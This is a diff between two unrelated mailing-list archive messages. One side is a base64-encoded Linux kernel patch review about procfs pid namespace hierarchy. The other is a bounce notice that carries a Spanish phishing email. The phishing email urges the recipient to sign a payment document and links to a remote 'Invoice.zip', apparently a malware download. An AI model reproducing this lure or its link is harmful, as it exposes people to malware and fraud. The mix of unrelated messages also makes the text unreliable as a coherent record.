@@ -1,16 +1,11 @@
-From: "Chen, Hanxiao" <chenhanxiao-BthXqXjhjHXQFUHtdCDX3A@public.gmane.org>
-Subject: RE: [PATCH v7 1/2] procfs: show hierarchy of pid namespace
-Date: Thu, 13 Nov 2014 09:44:41 +0000
-Message-ID: <5871495633F38949900D2BF2DC04883E63280E@G08CNEXMBPEKD02.g08.fujitsu.local>
-References: <1415786899-13392-1-git-send-email-chenhanxiao@cn.fujitsu.com>
-	<1415786899-13392-2-git-send-email-chenhanxiao@cn.fujitsu.com>
-	<5463413E.6000800@nod.at>
+From: mailer-daemon-5OsnY09SwD284A3lKvFPfwC/G2K4zDHf@public.gmane.org
+Subject: failure notice
+Date: 17 Nov 2014 13:03:07 -0000
+Message-ID: <20141117130952.00235800@mail.linuxfoundation.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: base64
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-In-Reply-To: <5463413E.6000800-/L3Ra7n9ekc@public.gmane.org>
-Content-Language: zh-CN
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -20,51 +15,40 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: Richard Weinberger <richard-/L3Ra7n9ekc@public.gmane.org>, "Eric W. Biederman" <ebiederm-aS9lmoZGLiVWk0Htik3J/w@public.gmane.org>, Serge Hallyn <serge.hallyn-GeWIH/nMZzLQT0dZR+AlfA@public.gmane.org>, Oleg
-	Nesterov <oleg-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
-Cc: Richard Weinberger <richard.weinberger-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>, "containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>, "linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org" <linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>, Mateusz Guzik <mguzik-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>, David Howells <dhowells-H+wXaHxf7aLQT0dZR+AlfA@public.gmane.org>
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-DQoNCj4gLS0tLS1PcmlnaW5hbCBNZXNzYWdlLS0tLS0NCj4gRnJvbTogUmljaGFyZCBXZWluYmVy
-Z2VyIFttYWlsdG86cmljaGFyZEBub2QuYXRdDQo+IFNlbnQ6IFdlZG5lc2RheSwgTm92ZW1iZXIg
-MTIsIDIwMTQgNzoxNSBQTQ0KPiBUbzogQ2hlbiwgSGFueGlhby/pmYgg5pmX6ZyEOyBFcmljIFcu
-IEJpZWRlcm1hbjsgU2VyZ2UgSGFsbHluOyBPbGVnIE5lc3Rlcm92DQo+IENjOiBjb250YWluZXJz
-QGxpc3RzLmxpbnV4LWZvdW5kYXRpb24ub3JnOyBsaW51eC1rZXJuZWxAdmdlci5rZXJuZWwub3Jn
-OyBEYXZpZA0KPiBIb3dlbGxzOyBSaWNoYXJkIFdlaW5iZXJnZXI7IFBhdmVsIEVtZWx5YW5vdjsg
-VmFzaWxpeSBLdWxpa292OyBNYXRldXN6IEd1emlrDQo+IFN1YmplY3Q6IFJlOiBbUEFUQ0ggdjcg
-MS8yXSBwcm9jZnM6IHNob3cgaGllcmFyY2h5IG9mIHBpZCBuYW1lc3BhY2UNCj4gDQo+IEFtIDEy
-LjExLjIwMTQgdW0gMTE6MDggc2NocmllYiBDaGVuIEhhbnhpYW86DQo+ID4gV2UgbGFjayBvZiBw
-aWQgaGllcmFyY2h5IGluZm9ybWF0aW9uLCBhbmQgdGhpcyB3aWxsIGxlYWQgdG86DQo+ID4gYSkg
-d2UgZG9uJ3Qga25vdyBwaWRzJyByZWxhdGlvbnNoaXAsIHdobyBpcyB3aG9zZSBjaGlsZDoNCj4g
-PiAgICAvcHJvYy9QSUQvbnMvcGlkIG9ubHkgdGVsbCB1cyB3aGV0aGVyIHR3byBwaWRzIGxpdmUg
-aW4gZGlmZmVyZW50IG5zDQo+ID4gYikgYnJpbmcgdHJvdWJsZSB0byBuZXN0ZWQgbHhjIGNvbnRh
-aW5lciBjaGVjay9yZXN0b3JlL21pZ3JhdGlvbg0KPiA+IGMpIGJyaW5nIHRyb3VibGUgdG8gcGlk
-IHRyYW5zbGF0aW9uIGJldHdlZW4gY29udGFpbmVyczsNCj4gPg0KPiA+IFRoaXMgcGF0Y2ggd2ls
-bCBzaG93IHRoZSBoaWVyYXJjaHkgb2YgcGlkIG5hbWVzcGFjZQ0KPiA+IGJ5IHBpZG5zX2hpZXJh
-cmNoeSBsaWtlOg0KPiA+DQo+ID4gPGluaXRfUElEPiA8cGFyZW50X29mX2luaXRfUElEPiA8cmVs
-YXRpdmUgUElEIGxldmVsPg0KPiA+DQo+ID4gRXg6DQo+ID4gW3Jvb3RAbG9jYWxob3N0IH5dI2Nh
-dCAvcHJvYy9waWRuc19oaWVyYXJjaHkNCj4gPiAxODA2MCAxIDENCj4gPiAxODEwMiAxODA2MCAy
-DQo+ID4gMTUzNCAgMTgxMDIgMw0KPiA+IDE2MDAgIDE4MTAyIDMNCj4gPiAxNTUwICAxIDENCj4g
-PiAqTm90ZTogbnVtYmVycyByZXByZXNlbnQgdGhlIHBpZCAxIGluIGRpZmZlcmVudCBucw0KPiA+
-DQpbc25pcF0NCj4gPiArDQo+ID4gKyNkZWZpbmUgTlNfSElFUkFSQ0hZCSJwaWRuc19oaWVyYXJj
-aHkiDQo+ID4gKyNkZWZpbmUgTUFYKGEsIGIpICgoYSkgPiAoYikgPyAoYSkgOiAoYikpDQo+IA0K
-PiBQbGVhc2UgdXNlIG1heCgpIGZyb20ga2VybmVsLmgsIHRoZXJlIGlzIG5vIG5lZWQgdG8gcmVp
-bnZlbnQgdGhlIHdoZWVsLg0KPiANCg0KVGhhbmtzIGZvciB5b3VyIHJlbWluZGluZy4NCg0KPiA+
-ICsNCj4gPiArLyogbGlzdCBmb3IgaG9zdCBwaWQgY29sbGVjdGlvbiAqLw0KPiA+ICtzdHJ1Y3Qg
-cGlkbnNfbGlzdCB7DQo+ID4gKwlzdHJ1Y3QgbGlzdF9oZWFkIGxpc3Q7DQo+ID4gKwlzdHJ1Y3Qg
-cGlkICpwaWQ7DQo+ID4gKwlpbnQgc2hvd19sZXZlbDsNCj4gDQo+IHMvc2hvd19sZXZlbC9sZXZl
-bCwgdG8ga2VlcCBpdCBlYXN5LiA6LSkNCg0KU3VyZSwgYWxzbyBjaGFuZ2UgdGhlIHR5cGUgdG8g
-dW5zaWduZWQgaW50IA0KZm9yIG1ha2luZyBtYXgoKSBoYXBweS4NCg0KW3NuaXBdDQo+ID4gK30N
-Cj4gPiArDQo+ID4gKy8qDQo+ID4gKyAqIGNvbGxlY3QgcGlkcyBhbmQgc3RvcmVkIGluIHBpZG5z
-X3BpZF9saXN0LA0KPiANCj4gcy9zdG9yZWQvc3RvcmUNCk9vcHMuLi4NCg0KPiANCj4gPiArICog
-dGhlbiByZW1vdmUgZHVwbGljYXRlZCBvbmVzLA0KPiA+ICsgKiBhZGQgdGhlIHJlc3QgdG8gcGlk
-bnNfcGlkX3RyZWUNCj4gPiArICovDQo+IA0KPiBUaGlzIGNvbW1lbnQgaXMgYSBiaXQgY29uZnVz
-aW5nLg0KPiANCj4gV2hhdCBhYm91dCAicHJvY19waWRuc19saXN0X3JlZnJlc2ggLSBGaW5kcyBh
-bGwgaW5pdCBwaWRzLCBwbGFjZXMgdGhlbSBpbnRvDQo+IHBpZG5zX3BpZF9saXN0DQo+IGFuZCB0
-aGVuIHN0b3JlcyB0aGUgaGlyYXJjaHkgaW50byBwaWRuc19waWRfdHJlZS4iPw0KPiANClRoYXQn
-cyBtdWNoIG1vcmUgY2xlYXIuDQoNCj4gQmVzaWRlIG9mIG15IG1pbm9yIGNvbW1lbnRzIEkgbGlr
-ZSB0aGUgcGF0Y2guIDotKQ0KPiBUaGFua3MgYSBsb3QgZm9yIGRvaW5nIHRoaXMgd29yayENCj4g
-DQoNClRoYW5rcyBmb3IgeW91ciBraW5kbHkgaGVscC4gOikNCg0KLSBDaGVuDQpfX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwpDb250YWluZXJzIG1haWxpbmcg
-bGlzdApDb250YWluZXJzQGxpc3RzLmxpbnV4LWZvdW5kYXRpb24ub3JnCmh0dHBzOi8vbGlzdHMu
-bGludXhmb3VuZGF0aW9uLm9yZy9tYWlsbWFuL2xpc3RpbmZvL2NvbnRhaW5lcnM=
+Mensaje Bounced
+
+<your-mSu2ax+dpWZBDgjK7y7TUQ@public.gmane.org>:
+Sorry, no mailbox here by that name. (#5.1.1)
+
+--- Below this line is a copy of the message.
+
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: (qmail 21070 invoked by uid 89); 17 Nov 2014 13:03:07 -0000
+Received: from unknown (HELO 178.237.38.134) (178.237.38.134)
+  by m1.hispaemails.com with SMTP; 17 Nov 2014 13:03:07 -0000
+Received: from [10.0.0.100] by 178.237.38.134 id rscrPWl4j6Lg; Mon, 17 Nov 2014 14:03:07 +0100
+Message-ID: <000a01d00266$d2c83400$6400000a-GM7RgVqrmjHdfRbmXnQopA@public.gmane.org>
+From: "Sabrina" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <your-mSu2ax+dpWZBDgjK7y7TUQ@public.gmane.org>
+Subject: !Cambios Cuenta Id-356754732.
+Date: Mon, 17 Nov 2014 14:03:07 +0100
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 8bit
+
+
+
+               
+Hola, your-mSu2ax+dpWbowKkBSvOlow@public.gmane.org
+                
+Firma el documento para el pago, y nos envia de vuelta.
+Los nuevos datos se pueden consultar en
+http://corederoma.net/Invoice.zip?Generate_to_client:your-mSu2ax+dpWZBDgjK7y7TUQ@public.gmane.org
+
+
+___
+Tel.Fax.: 91-125-329-90         
+Ticket Service.    
